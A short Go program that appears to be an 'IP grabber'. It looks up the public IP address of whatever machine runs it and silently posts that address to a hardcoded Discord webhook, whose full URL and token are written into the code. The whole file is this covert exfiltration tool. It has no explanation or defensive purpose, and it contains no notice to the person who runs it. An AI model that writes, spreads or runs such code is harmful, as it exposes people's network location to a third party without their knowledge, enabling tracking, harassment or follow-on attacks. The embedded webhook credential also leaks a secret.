package main

import (
	"encoding/json"
	"bytes"
 	"net/http"
 	"io/ioutil"
 	"log"
)
func main() {
	webhook := "https://discord.com/api/webhooks/814908183700832256/9xfawk4QSfTTLY45s6ZtNTramuQ9X8NYnudJ_t-xuNZzVOmGSq1IXCjDwd1LpkcYDB59" //webhook here ofc

	resp, err := http.Get("https://ipv4.wtfismyip.com/text")
		if err != nil {
			log.Fatal(err)
		}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	ipaddr := string(body)

	if err != nil {
		log.Fatal(err)
	}
	reqBody, err := json.Marshal(map[string]string{
		"content": ipaddr,
	})

	if err != nil {
		log.Fatal(err)

	}

	resp, err = http.Post(webhook, "application/json", bytes.NewBuffer(reqBody))
	if err != nil {
		log.Fatal(err)
	}

}
